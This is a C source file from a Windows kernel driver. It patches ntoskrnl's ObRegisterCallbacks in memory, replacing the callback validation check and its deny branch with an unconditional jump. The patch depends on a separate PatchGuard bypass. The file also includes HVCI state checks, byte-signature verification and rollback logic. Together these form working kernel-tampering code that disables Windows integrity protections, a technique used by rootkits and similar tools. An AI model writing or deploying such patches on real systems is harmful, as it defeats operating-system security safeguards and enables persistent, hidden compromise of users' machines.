#include "ObGatePatch.h"
#include "Bypass.h"
#include "KernelWrite.h"

//
// Verified against VM_Logs\ntoskrnl.exe 10.0.26100.4351 (SHA-256
// EB3AFF3F0C7D210E31DC8DA896493B2F74DBAFE8EBF2C10B0600E33CB3139AA2),
// ObRegisterCallbacks at RVA 0x9efc40.
//
#define OB_CALLBACKS_PRE_RVA  0x9efd60
#define OB_CALLBACKS_POST_RVA 0x9efd77
#define GATE_PATCH_LEN 14

//
// 0x1409efd60  BA 20 00 00 00        mov edx, 0x20
//             E8 CA C1 B0 FF        call 0x1404fbf34
//             85 C0                 test eax, eax
//             74 6F                 jz  0x1409efddd
//
// 0x1409efd77  BA 20 00 00 00        mov edx, 0x20
//             E8 B3 C1 B0 FF        call 0x1404fbf34
//             85 C0                 test eax, eax
//             74 58                 jz  0x1409efddd
//
// Both become an unconditional jump to the next valid entry in the same block
// (skipping the validation and its deny branch), then padding. The jz target
// sits at +0x0D, so the replacement is EB 0C plus 12 NOPs.
//
static const UCHAR kPreOriginal[GATE_PATCH_LEN] = {
    0xBA, 0x20, 0x00, 0x00, 0x00, 0xE8, 0xCA, 0xC1,
    0xB0, 0xFF, 0x85, 0xC0, 0x74, 0x6F
};
static const UCHAR kPostOriginal[GATE_PATCH_LEN] = {
    0xBA, 0x20, 0x00, 0x00, 0x00, 0xE8, 0xB3, 0xC1,
    0xB0, 0xFF, 0x85, 0xC0, 0x74, 0x58
};
static const UCHAR kGatePatched[GATE_PATCH_LEN] = {
    0xEB, 0x0C, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};

static UCHAR g_PreSaved[GATE_PATCH_LEN];
static UCHAR g_PostSaved[GATE_PATCH_LEN];
static BOOLEAN g_PreSavedOk;
static BOOLEAN g_PostSavedOk;
static BOOLEAN g_Applied;

#define SYSTEM_CODE_INTEGRITY_INFORMATION_CLASS 103

typedef struct _CI_POLICY_OPTIONS {
  ULONG Boot;
  ULONG Runtime;
  ULONG SecureBoot;
  ULONG CodeIntegrity;
  ULONG CodeIntegrityHeader;
  ULONG CodeIntegritySomedx;
} CI_POLICY_OPTIONS;

typedef struct _SYSTEM_CODE_INTEGRITY_INFORMATION {
  ULONG Length;
  ULONG CodeIntegrityOptions;
  ULONG CodeIntegrityCatalogOptions;
  ULONG CodeIntegrityCatalogVersion;
  ULONG CodeIntegrityCatalogTimestamp;
  UCHAR CodeIntegrityPolicyEnforcementStatus;
  UCHAR CodeIntegrityPolicyEnforcementUpdates;
  UCHAR CodeIntegrityPolicyInEnforcementModeSystem;
  UCHAR CodeIntegrityPolicyInEnforcementModeUser;
  CI_POLICY_OPTIONS Options;
} SYSTEM_CODE_INTEGRITY_INFORMATION;

//
// Writing executable pages fails hard when memory integrity (HVCI/Kernel-mode
// code integrity) is enforced, so report the state instead of finding out with
// a bugcheck. The VM used for this project runs with HVCI off, but a machine
// that does not must fail closed.
//
typedef NTSTATUS(NTAPI *PFN_NT_QUERY_SYSTEM_INFORMATION)(
    ULONG SystemInformationClass, PVOID SystemInformation, ULONG Length,
    PULONG ReturnLength);

//
// Resolved by name rather than imported: the driver links only what the
// ntoskrnl import table already pulls in, and this keeps the dependency
// explicit instead of relying on an implicit Nt* export.
//
static NTSTATUS QueryHvciState(VOID) {
  SYSTEM_CODE_INTEGRITY_INFORMATION info;
  PFN_NT_QUERY_SYSTEM_INFORMATION query;
  UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"NtQuerySystemInformation");
  ULONG returned = 0;
  NTSTATUS status;

  query = (PFN_NT_QUERY_SYSTEM_INFORMATION)MmGetSystemRoutineAddress(
      &routineName);
  if (query == NULL) {
    DbgPrint("[LongsDriver] ObGatePatch: NtQuerySystemInformation "
             "unavailable, refusing to patch.\n");
    return STATUS_NOT_FOUND;
  }

  RtlZeroMemory(&info, sizeof(info));
  info.Length = sizeof(info);

  status = query(SYSTEM_CODE_INTEGRITY_INFORMATION_CLASS, &info, sizeof(info),
                 &returned);
  if (!NT_SUCCESS(status)) {
    //
    // Not being able to ask is not the same as being enforced, but it is not
    // a positive confirmation either. Treat it as enforced and refuse: the
    // signature check below is the real guard, this is only about avoiding a
    // fault while writing.
    //
    DbgPrint("[LongsDriver] ObGatePatch: code integrity query failed 0x%X, "
             "refusing to patch.\n",
             status);
    return status;
  }

  if (info.CodeIntegrityPolicyInEnforcementModeSystem != 0) {
    DbgPrint("[LongsDriver] ObGatePatch: memory integrity enforced (status="
             "%u, opts=0x%X), refusing to patch.\n",
             info.CodeIntegrityPolicyEnforcementStatus,
             info.CodeIntegrityOptions);
    return STATUS_DEVICE_CONFIGURATION_ERROR;
  }

  DbgPrint("[LongsDriver] ObGatePatch: memory integrity not enforced "
           "(status=%u, opts=0x%X).\n",
           info.CodeIntegrityPolicyEnforcementStatus, info.CodeIntegrityOptions);
  return STATUS_SUCCESS;
}

static VOID LogActual(const char *Label, const UCHAR *Bytes) {
  DbgPrint("[LongsDriver] ObGatePatch: %s signature mismatch, actual: ",
           Label);
  for (ULONG i = 0; i < GATE_PATCH_LEN; i++) {
    DbgPrint("%02X ", Bytes[i]);
  }
  DbgPrint("\n");
}

static BOOLEAN ReadAndMatch(ULONGLONG Address, const UCHAR *Expected,
                            const char *Label, UCHAR *OutActual) {
  RtlCopyMemory(OutActual, (PVOID)Address, GATE_PATCH_LEN);
  if (RtlCompareMemory(OutActual, Expected, GATE_PATCH_LEN) ==
      GATE_PATCH_LEN) {
    return TRUE;
  }
  LogActual(Label, OutActual);
  return FALSE;
}

static NTSTATUS WriteBytes(ULONGLONG Address, const UCHAR *Bytes) {
  return KernelWrite((PVOID)Address, (PVOID)Bytes, GATE_PATCH_LEN);
}

NTSTATUS ObGatePatchApply(VOID) {
  PVOID kernelBase = NULL;
  ULONG kernelSize = 0;
  ULONGLONG preAddr;
  ULONGLONG postAddr;
  NTSTATUS status;

  if (g_Applied) {
    return STATUS_SUCCESS;
  }

  if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
    DbgPrint("[LongsDriver] ObGatePatch: must run at PASSIVE_LEVEL.\n");
    return STATUS_INVALID_DEVICE_STATE;
  }

  //
  // Mutating ntoskrnl code is a PatchGuard trigger. Without the bypass the
  // system will bugcheck a few seconds later, so refuse up front.
  //
  if (!g_PatchGuardBypassed) {
    DbgPrint("[LongsDriver] ObGatePatch: PatchGuard bypass inactive, "
             "refusing to patch.\n");
    return STATUS_DEVICE_CONFIGURATION_ERROR;
  }

  status = QueryHvciState();
  if (!NT_SUCCESS(status)) {
    return status;
  }

  if (!BypassGetKernelBaseNSize(&kernelBase, &kernelSize)) {
    DbgPrint("[LongsDriver] ObGatePatch: could not locate ntoskrnl.\n");
    return STATUS_NOT_FOUND;
  }

  preAddr = (ULONGLONG)kernelBase + OB_CALLBACKS_PRE_RVA;
  postAddr = (ULONGLONG)kernelBase + OB_CALLBACKS_POST_RVA;

  //
  // Both sites must be inside the kernel image, and inside .text rather than a
  // trailing data region, otherwise the RVAs are stale for this build.
  //
  if ((OB_CALLBACKS_POST_RVA + GATE_PATCH_LEN) > kernelSize) {
    DbgPrint("[LongsDriver] ObGatePatch: target RVA outside ntoskrnl "
             "(size 0x%X).\n",
             kernelSize);
    return STATUS_INVALID_PARAMETER;
  }

  if (!ReadAndMatch(preAddr, kPreOriginal, "PreOperation", g_PreSaved)) {
    return STATUS_REVISION_MISMATCH;
  }
  g_PreSavedOk = TRUE;

  if (!ReadAndMatch(postAddr, kPostOriginal, "PostOperation", g_PostSaved)) {
    return STATUS_REVISION_MISMATCH;
  }
  g_PostSavedOk = TRUE;

  //
  // All-or-nothing: if the second write fails, put the first one back so we
  // never leave ObRegisterCallbacks half patched.
  //
  status = WriteBytes(preAddr, kGatePatched);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] ObGatePatch: PreOperation write failed 0x%X.\n",
             status);
    (VOID)WriteBytes(preAddr, g_PreSaved);
    return status;
  }

  status = WriteBytes(postAddr, kGatePatched);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] ObGatePatch: PostOperation write failed 0x%X, "
             "rolling back.\n",
             status);
    (VOID)WriteBytes(postAddr, g_PostSaved);
    (VOID)WriteBytes(preAddr, g_PreSaved);
    return status;
  }

  g_Applied = TRUE;
  DbgPrint("[LongsDriver] ObGatePatch: OB callback validation relaxed at "
           "ntoskrnl+0x%X and +0x%X.\n",
           OB_CALLBACKS_PRE_RVA, OB_CALLBACKS_POST_RVA);
  return STATUS_SUCCESS;
}

VOID ObGatePatchRevert(VOID) {
  PVOID kernelBase = NULL;
  ULONG kernelSize = 0;

  if (!g_Applied) {
    return;
  }

  if (!BypassGetKernelBaseNSize(&kernelBase, &kernelSize) ||
      (OB_CALLBACKS_POST_RVA + GATE_PATCH_LEN) > kernelSize) {
    //
    // Without the image base there is nowhere to write the originals back.
    // Leaving the patch in place is the lesser failure here: the gate stays
    // relaxed but the callback itself is still valid, whereas restoring into
    // an unknown address would be fatal.
    //
    DbgPrint("[LongsDriver] ObGatePatch: cannot locate ntoskrnl during "
             "revert, patch left in place.\n");
    return;
  }

  if (g_PostSavedOk) {
    (VOID)WriteBytes((ULONGLONG)kernelBase + OB_CALLBACKS_POST_RVA, g_PostSaved);
    g_PostSavedOk = FALSE;
  }
  if (g_PreSavedOk) {
    (VOID)WriteBytes((ULONGLONG)kernelBase + OB_CALLBACKS_PRE_RVA, g_PreSaved);
    g_PreSavedOk = FALSE;
  }

  g_Applied = FALSE;
  DbgPrint("[LongsDriver] ObGatePatch: original ObRegisterCallbacks bytes "
           "restored.\n");
}

BOOLEAN ObGatePatchIsApplied(VOID) { return g_Applied; }
